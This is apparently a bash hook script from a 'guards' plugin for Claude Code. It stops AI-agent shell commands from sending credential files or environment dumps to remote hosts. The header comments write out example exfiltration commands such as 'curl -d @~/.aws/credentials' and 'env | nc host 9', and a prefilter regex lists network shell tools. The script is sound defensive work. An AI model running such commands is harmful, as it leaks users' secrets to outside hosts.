#!/usr/bin/env bash
# guards/hooks/outbound-guard.sh — PreToolUse hook on Bash: stops a command from
# SENDING credential material to a remote host.
#
# WHY: the output hooks see what comes back from a command, and the publish
# guard sees a short list of publish verbs. Neither sees a network client sending
# a credential store (curl -d @~/.aws/credentials, env | nc host 9, scp key host:).
# That is the most direct way a credential leaves the machine, and an agent can do
# it in one command.
#
# WHAT IT CHECKS (by reference; literal credentials in the command text are the
# next unit, #63):
#   - a FILE a client would read and send: curl -d/--data*/-F/-T/-H @file,
#     wget --post-file/--body-file, HTTPie field@file, scp/rsync/sftp sources,
#     `client < file`, `cat file | client`, `client "$(cat file)"`. The file is
#     classified with credclass-lib.sh, the same lists as credfile-guard: a
#     credential store (cloud credentials, SSH key, docker config, netrc, any
#     file holding a private-key header) denies; .env, kubeconfig, .npmrc, .pypirc
#     and terraform state ask where a person can answer and deny elsewhere.
#   - the WHOLE ENVIRONMENT (env, printenv, set, export -p) piped into a client:
#     deny; a filtered dump (env | grep ... | client) asks or denies by mode.
# The `@` is not the problem: curl -H @headers.txt is the recommended safe form and
# is allowed. What matters is what the file IS. Variable, config-file (-K), netrc
# and stdin forms put no credential in the command and are not flagged.
#
# NOT SEEN (documented in docs/LIMITS.md): a file named through a variable or a
# substitution (noted, allowed), aliases, functions, scripts, other interpreters,
# state across commands, cloud CLIs. Best effort, not a sandbox.
#
# FAIL CLOSED for a command that names a client: if the check cannot finish
# (deadline, crash, no awk) the call is denied with the reason. A parser limit
# (unbalanced quoting, over 8 KB, depth cap) is not a failure: no decision, plus a
# one-line note. A command that names no client costs one prefilter (a bash regex
# on the raw payload) and exits before anything else runs.
#
# OVERRIDE: GUARDS_ALLOW_OUTBOUND_SECRETS=1 in the environment Claude Code was
# started from. The caller of this hook is usually an AI agent, so the override
# must be something the agent cannot type for itself: set in front of a command
# it changes nothing, because it is read from the hook's own environment.
# GUARDS_OUTBOUND_ASK: 1 (default) asks where a person can answer, 0 denies in
# every mode, force asks in every mode.
#
# Never returns updatedInput, so it can coexist with the other PreToolUse hooks on
# Bash (deny beats ask beats allow, whatever the order).

set -uo pipefail

[ "${GUARDS_ALLOW_OUTBOUND_SECRETS:-0}" = "1" ] && exit 0

HOOK_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Prefilter, outer run only: a command that names no client never gets further.
# It runs BEFORE the deadline wrapper (the wrapper costs about 7 ms by itself).
if [ -z "${GUARDS_DEADLINE_INNER:-}" ]; then
  RAW="$(cat)"
  PREFILTER_RE='(^|[^A-Za-z0-9_./-])(curl|wget|http|https|xh|nc|ncat|netcat|scp|rsync|sftp|ssh|ftp|telnet|socat)([^A-Za-z0-9_-]|$)'
  [[ "$RAW" =~ $PREFILTER_RE ]] || exit 0
  exec 0<<< "$RAW"
  # shellcheck source=guards/hooks/deadline-lib.sh
  . "$HOOK_DIR/deadline-lib.sh" && guards_deadline deny 6
fi

RAW="$(cat)"
# shellcheck source=guards/hooks/json-lib.sh
. "$HOOK_DIR/json-lib.sh"   # HAVE_JQ, jfield, emit_pre, emit_context

deny() {
  emit_pre deny "$1"
  exit 0
}

if [ "$HAVE_JQ" -eq 1 ]; then
  # One jq call for the four fields (a call per field is about 10 ms each).
  { IFS= read -r TOOL_NAME; IFS= read -r CWD; IFS= read -r PERM_MODE; CMD="$(cat)"; } < <(
    printf '%s' "$RAW" | jq -r '(.tool_name // ""), (.cwd // ""), (.permission_mode // ""), (.tool_input.command // "")' 2> /dev/null
  )
else
  TOOL_NAME="$(jfield tool_name)"
  CWD="$(jfield cwd)"
  PERM_MODE="$(jfield permission_mode)"
  CMD="$(jfield command)"
fi

# The payload could not be read and there is no jq to say why: the call names a
# client (the prefilter matched), so refuse rather than guess.
if [ "$HAVE_JQ" -eq 0 ] && [ -z "$TOOL_NAME" ]; then
  deny "Blocked by guards outbound-guard: jq is not installed and the hook payload could not be read without it, so this call cannot be checked. Install jq (apt install jq, brew install jq) and retry. If the user really wants the call to go through unchecked, they must start Claude Code with GUARDS_ALLOW_OUTBOUND_SECRETS=1."
fi
[ "$TOOL_NAME" = "Bash" ] || exit 0
[ -n "$CMD" ] || exit 0
[ -n "$CWD" ] || CWD="$PWD"

SNIFF_MAX_BYTES="${CREDFILE_SNIFF_MAX_BYTES:-10485760}"
PRIVATE_KEY_RE='-----BEGIN ([A-Z0-9]+ )*PRIVATE KEY( BLOCK)?-----'

# shellcheck source=guards/hooks/credclass-lib.sh
. "$HOOK_DIR/credclass-lib.sh" 2> /dev/null || deny "Blocked by guards outbound-guard: its classification library credclass-lib.sh is missing or unreadable next to the hook ($HOOK_DIR/credclass-lib.sh), so this call cannot be checked and is denied. Reinstall or update the guards plugin."
# shellcheck source=guards/hooks/outbound-lib.sh
. "$HOOK_DIR/outbound-lib.sh" 2> /dev/null || deny "Blocked by guards outbound-guard: its parser library outbound-lib.sh is missing or unreadable next to the hook ($HOOK_DIR/outbound-lib.sh), so this call cannot be checked and is denied. Reinstall or update the guards plugin."

# A person can answer an ask only in these modes; elsewhere Claude Code answers it
# itself (verified live in auto mode), so the guard denies instead.
HUMAN=0
case "$PERM_MODE" in default | acceptEdits | plan) HUMAN=1 ;; esac
[ "${GUARDS_OUTBOUND_ASK:-1}" = "force" ] && HUMAN=1
CAN_ASK=0
{ [ "${GUARDS_OUTBOUND_ASK:-1}" = "1" ] || [ "${GUARDS_OUTBOUND_ASK:-1}" = "force" ]; } && [ "$HUMAN" -eq 1 ] && CAN_ASK=1

SAFE_FORMS="To authenticate a request without putting the credential in the command, keep it in a file only you can read and pass that file: for curl use -K <config file>, --netrc-file <file> or -H @<headers file>; for wget use --config <file>. To check that a key works without sending it, use ssh -i <key> or ssh-keygen -l -f <key>."
OVERRIDE="If the user really wants this to go through, they must start Claude Code with GUARDS_ALLOW_OUTBOUND_SECRETS=1."

DENY_MSG=""
ASK_MSG=""
NOTES=""

note() { # note TEXT -- one line each, joined
  NOTES="${NOTES:+$NOTES }$1"
}

# where_of CLIENT FLAG -> how the file reaches the client, in words. Never a path.
where_of() {
  local client="$1" flag="$2"
  case "$flag" in
    --[A-Za-z]) printf '%s -%s' "$client" "${flag#--}" ;;
    -*) printf '%s %s' "$client" "$flag" ;;
    stdin) printf '%s reading it from standard input (<)' "$client" ;;
    source) printf '%s copying it as a source' "$client" ;;
    field@) printf '%s sending it as a request field' "$client" ;;
    *) printf '%s (%s)' "$client" "$flag" ;;
  esac
}

# flag_cred WHY WHERE -- WHY is the credclass reason ("AWS credentials file").
flag_cred() {
  local why="$1" where="$2"
  if is_ask_class "$why"; then
    if [ "$CAN_ASK" -eq 1 ]; then
      [ -n "$ASK_MSG" ] || ASK_MSG="guards outbound-guard: this would send the contents of a file the guards treat as credential-adjacent ($why) to a remote host, via $where. Approve only if you really mean to send it. ${SAFE_FORMS}"
      return 0
    fi
    local mode=""
    [ "${GUARDS_OUTBOUND_ASK:-1}" != "0" ] && mode=" [permission mode '${PERM_MODE:-unknown}' has no person to answer an approval prompt, so this is blocked instead of asked]"
    [ -n "$DENY_MSG" ] || DENY_MSG="Blocked by guards outbound-guard: this would send credential-adjacent material ($why) to a remote host, via $where${mode}. ${SAFE_FORMS} ${OVERRIDE}"
    return 0
  fi
  [ -n "$DENY_MSG" ] || DENY_MSG="Blocked by guards outbound-guard: this would send credential material ($why) to a remote host, via $where. Send the data you mean to send, not the credential store. ${SAFE_FORMS} ${OVERRIDE}"
}

classify_path() { # classify_path RAWPATH WHERE
  local raw="$1" where="$2" p why expanded e
  [ -n "$raw" ] || return 0
  case "$raw" in -) return 0 ;; esac
  case "$raw" in
    *'*'* | *'?'* | *'['*)
      expanded="$(cd "$CWD" 2> /dev/null && compgen -G "$raw" | head -n 20)"
      if [ -z "$expanded" ] && [ "${raw#\~}" != "$raw" ]; then
        expanded="$(compgen -G "${HOME}/${raw#\~/}" | head -n 20)"
      fi
      while IFS= read -r e; do [ -n "$e" ] && classify_path "$e" "$where"; done <<< "$expanded"
      return 0 ;;
  esac
  p="$(resolve_path "$raw")"
  [ -n "$p" ] || return 0
  if why="$(sensitive_reason "$p")"; then
    flag_cred "$why" "$where"
  elif [ -d "$p" ] && why="$(sensitive_dir_reason "$p")"; then
    flag_cred "$why" "$where"
  fi
  return 0
}

HAVE_CLIENT=0
RECS="$(printf '%s' "$CMD" | outbound_parse)"
while IFS=$'\t' read -r kind a b c; do
  case "$kind" in
    C) HAVE_CLIENT=1 ;;
    F) classify_path "$c" "$(where_of "$a" "$b")" ;;
    S)
      case "$b" in
        envdump)
          [ -n "$DENY_MSG" ] || DENY_MSG="Blocked by guards outbound-guard: the whole environment ($c) would be sent to a remote host by $a. It holds every secret the session can see. Send only the variables you need, by name, or write them to a file you intend to send. ${SAFE_FORMS} ${OVERRIDE}" ;;
        envdump-filtered)
          if [ "$CAN_ASK" -eq 1 ]; then
            [ -n "$ASK_MSG" ] || ASK_MSG="guards outbound-guard: a filtered dump of the environment ($c, then a filter) would be sent to a remote host by $a. Approve only if the filter leaves out every secret. ${SAFE_FORMS}"
          else
            [ -n "$DENY_MSG" ] || DENY_MSG="Blocked by guards outbound-guard: a filtered dump of the environment ($c, then a filter) would be sent to a remote host by $a, and permission mode '${PERM_MODE:-unknown}' has no person to approve it. Send only the variables you need, by name. ${SAFE_FORMS} ${OVERRIDE}"
          fi ;;
        pipearg) classify_path "$c" "a pipe into $a" ;;
        subst) classify_path "$c" "a command substitution passed to $a" ;;
        redir) classify_path "$c" "$a reading it from standard input (<)" ;;
        stdin-op) ;;
      esac ;;
    U) note "guards outbound-guard: a file operand of $a is named through a variable or substitution, so it could not be checked (allowed). The guard only sees paths written in the command." ;;
    X)
      if [ "$a" = "awk-failed" ]; then
        deny "Blocked by guards outbound-guard: the command parser (awk) could not run, so this command, which names a network client, cannot be checked and is denied. Check that a POSIX awk is on PATH. $OVERRIDE"
      fi
      note "guards outbound-guard: this command was not fully checked ($a); the literal-credential and file checks that could run did." ;;
    L) ;;   # literal credentials in the command text: handled in the next unit
  esac
done <<< "$RECS"

[ "$HAVE_CLIENT" -eq 1 ] || [ -n "$NOTES" ] || exit 0
[ -z "$DENY_MSG" ] || deny "$DENY_MSG"
if [ -n "$ASK_MSG" ]; then
  emit_pre ask "$ASK_MSG"
  exit 0
fi
[ -z "$NOTES" ] || emit_context PreToolUse "$NOTES"
exit 0
